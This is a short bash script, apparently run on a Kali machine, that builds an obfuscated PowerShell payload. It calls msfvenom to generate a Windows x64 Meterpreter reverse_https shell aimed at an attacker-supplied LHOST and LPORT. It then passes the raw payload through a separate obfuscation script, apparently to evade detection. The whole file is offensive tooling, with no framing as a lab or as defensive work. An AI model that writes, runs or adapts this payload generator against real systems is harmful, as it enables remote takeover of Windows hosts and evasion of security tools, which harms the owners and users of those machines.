#!/bin/bash

# Payload Generation Script
echo "=== PowerShell Payload Generator ==="
echo

if [ -z "$1" ] || [ -z "$2" ]; then
    echo "Usage: ./generate_payload.sh <LHOST> <LPORT>"
    echo "Example: ./generate_payload.sh 192.168.1.100 4444"
    exit 1
fi

LHOST=$1
LPORT=$2
OUTPUT_DIR="/home/kali/payloads"

echo "[*] Generating PowerShell reverse shell payload..."
echo "[*] LHOST: $LHOST"
echo "[*] LPORT: $LPORT"

# Generate base64 encoded PowerShell payload
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$LHOST LPORT=$LPORT -f psh-reflection -o $OUTPUT_DIR/payload_raw.ps1

if [ $? -eq 0 ]; then
    echo "[+] Raw payload generated: $OUTPUT_DIR/payload_raw.ps1"
    echo "[*] Applying obfuscation..."
    python3 /home/kali/obfuscate.py $OUTPUT_DIR/payload_raw.ps1 $OUTPUT_DIR/payload_obfuscated.ps1
    echo "[+] Obfuscated payload ready: $OUTPUT_DIR/payload_obfuscated.ps1"
else
    echo "[-] Payload generation failed!"
    exit 1
fi
